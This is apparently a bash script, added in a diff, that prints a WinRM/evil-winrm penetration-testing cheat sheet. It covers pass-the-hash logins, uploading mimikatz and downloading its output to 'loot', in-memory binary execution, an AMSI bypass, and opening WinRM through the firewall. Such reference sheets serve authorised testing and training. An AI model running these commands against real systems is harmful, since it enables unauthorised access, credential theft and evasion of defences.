@@ -1,0 +1,47 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── WINRM / EVIL-WINRM ───────────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── evil-winrm — Connect ─────────────────────────────${NC}"
+echo -e "  ${GREEN}evil-winrm -i <IP> -u <USER> -p <PASS>${NC}            # password"
+echo -e "  ${GREEN}evil-winrm -i <IP> -u <USER> -H <NTLM>${NC}            # hash (PTH)"
+echo -e "  ${GREEN}evil-winrm -i <IP> -u <USER> -p <PASS> -S${NC}         # HTTPS (5986)"
+echo -e "  ${GREEN}evil-winrm -i <IP> -u <USER> -p <PASS> -c cert.pem -k key.pem -S${NC}  # cert"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── evil-winrm — In-Shell Commands ───────────────────${NC}"
+echo -e "  ${GREEN}upload /local/path/mimikatz.exe 'C:\Windows\Tasks\mimikatz.exe'${NC}"
+echo -e "  ${GREEN}download 'C:\Windows\Tasks\mimikatz.log' /home/kali/loot/${NC}"
+echo -e "  ${GREEN}menu${NC}                                               # show available modules"
+echo -e "  ${GREEN}Invoke-Binary /path/to/Seatbelt.exe${NC}               # run .NET binary in memory"
+echo -e "  ${GREEN}bypass-4msi${NC}                                        # bypass AMSI"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Check WinRM access (nxc) ─────────────────────────${NC}"
+echo -e "  ${GREEN}nxc winrm <TARGET> -u <USER> -p <PASS>${NC}"
+echo -e "  ${GREEN}nxc winrm <TARGET> -u <USER> -H <NTLM>${NC}"
+echo -e "  Note: Look for Pwn3d! in output"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Enable WinRM (if you have SYSTEM / RCE) ──────────${NC}"
+echo -e "  ${GREEN}Enable-PSRemoting -Force${NC}"
+echo -e "  ${GREEN}winrm quickconfig -force${NC}"
+echo -e "  ${GREEN}netsh advfirewall firewall add rule name='WinRM' dir=in action=allow protocol=TCP localport=5985${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Native PowerShell Remoting ───────────────────────${NC}"
+echo -e "  ${GREEN}Enter-PSSession -ComputerName <HOST> -Credential (Get-Credential)${NC}"
+echo -e "  ${GREEN}\$sess = New-PSSession -ComputerName <HOST> -Credential \$cred${NC}"
+echo -e "  ${GREEN}Invoke-Command -Session \$sess -ScriptBlock { whoami }${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
